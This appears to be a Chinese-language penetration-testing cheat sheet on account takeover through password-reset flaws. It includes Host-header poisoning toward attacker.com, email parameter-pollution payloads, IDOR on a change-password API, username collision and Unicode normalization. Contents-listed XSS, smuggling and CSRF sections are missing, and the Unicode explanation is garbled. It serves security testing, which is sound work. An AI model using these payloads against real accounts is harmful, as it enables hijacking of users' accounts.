# 帐户接管

> 帐户接管（ATO）是网络安全领域中的一个重要威胁，涉及通过各种攻击向量对用户帐户进行未经授权的访问。

## 概述

* [密码重置功能](#password-reset-feature)
    * [通过引用头泄露密码重置令牌](#password-reset-token-leak-via-referrer)
    * [通过密码重置中毒实现帐户接管](#account-takeover-through-password-reset-poisoning)
    * [通过电子邮件参数重置密码](#password-reset-via-email-parameter)
    * [API参数上的IDOR](#idor-on-api-parameters)
    * [弱密码重置令牌](#weak-password-reset-token)
    * [泄露密码重置令牌](#leaking-password-reset-token)
    * [通过用户名冲突重置密码](#password-reset-via-username-collision)
    * [由于Unicode规范化问题导致的帐户接管](#account-takeover-due-to-unicode-normalization-issue)
* [通过Web漏洞实现帐户接管](#account-takeover-via-web-vulneralities)
    * [通过跨站脚本实现帐户接管](#account-takeover-via-cross-site-scripting)
    * [通过HTTP请求走私实现帐户接管](#account-takeover-via-http-request-smuggling)
    * [通过CSRF实现帐户接管](#account-takeover-via-csrf)
* [参考资料](#references)

## 密码重置功能

### 通过引用头泄露密码重置令牌

1. 请求将密码重置到你的电子邮件地址
2. 点击密码重置链接
3. 不要更改密码
4. 点击任何第三方网站（例如：Facebook、Twitter）
5. 在Burp Suite代理中拦截请求
6. 检查引用头是否泄露了密码重置令牌。

### 通过密码重置中毒实现帐户接管

1. 在Burp Suite中拦截密码重置请求
2. 在Burp Suite中添加或编辑以下标头：`Host: attacker.com`，`X-Forwarded-Host: attacker.com`
3. 转发带有修改后标头的请求

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```

4. 查找基于*主机头*的密码重置URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### 通过电子邮件参数重置密码

```powershell
# 参数污染
email=victim@mail.com&email=hacker@mail.com

# 邮件数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### API参数上的IDOR

1. 攻击者需要登录他们的帐户并进入**更改密码**功能。
2. 启动Burp Suite并拦截请求
3. 将其发送到重复器选项卡并编辑参数：用户ID/电子邮件

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### 弱密码重置令牌

密码重置令牌应该每次随机生成并且唯一。尝试确定令牌是否过期或是否始终相同，在某些情况下生成算法较弱且可以被猜测。以下变量可能被算法使用。

* 时间戳
* 用户ID
* 用户电子邮件
* 名字和姓氏
* 出生日期
* 加密技术
* 仅数字
* 短令牌序列（<6个字符在[A-Z,a-z,0-9]之间）
* 令牌重用
* 令牌过期日期

### 泄露密码重置令牌

1. 使用API/UI为特定电子邮件触发密码重置请求，例如：<test@mail.com>
2. 检查服务器响应并查找`resetToken`
3. 然后在URL中使用该令牌，例如`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### 通过用户名冲突重置密码

1. 使用与受害者的用户名相同的用户名注册系统，但在用户名前后插入空格。例如：`"admin "`
2. 使用恶意用户名请求密码重置。
3. 使用发送到你邮箱的令牌重置受害者密码。
4. 使用新密码连接到受害者的帐户。

平台CTFd对此攻击存在漏洞。  
参见：[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### 由于Unicode规范化问题导致的帐户接管

在处理涉及Unicode的用户输入以进行大小写映射或规范化时，可能会发生意外行为。

* 受害者帐户：`demo@gmail.com`
* 攻击者帐户：`demo\u0308@gmail.com`（使用组合字符U+0308生成另一个“e”）

#### 解决方法

* 在存储之前对所有用户输入进行标准化
* 在比较之前对所有用户输入进行标准化